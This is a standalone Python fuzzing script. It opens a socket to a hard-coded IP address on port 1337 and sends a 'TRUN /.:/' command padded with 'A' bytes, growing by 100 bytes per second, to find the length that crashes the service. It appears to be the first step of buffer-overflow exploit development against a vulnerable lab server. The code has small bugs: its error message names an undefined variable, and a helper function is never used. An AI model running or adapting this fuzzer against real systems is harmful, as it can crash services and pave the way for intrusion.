#!/usr/bin/env python3

import socket
import sys
import time

def pattern(x):
    return b'A' * x

def main():
    try:
        print("Connecting to the server...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('167.99.21.190', 1337))
        print("Sending the pattern payload...")
        i = 100
        try:
            while i < 5000:
                print(f"Pattern {i} sent successfully")
                s.send(b'TRUN /.:/' + b'A' * i)
                i+=100
                time.sleep(1)
                response = s.recv(1024)
                print("Server response:", response.decode())
        except Exception as e:
            print(f"Error sending or receiving data len {x}", e)
        s.close()
    except Exception as e:
        print("Error connecting to the server: {}".format(e))

if __name__ == "__main__":
    main()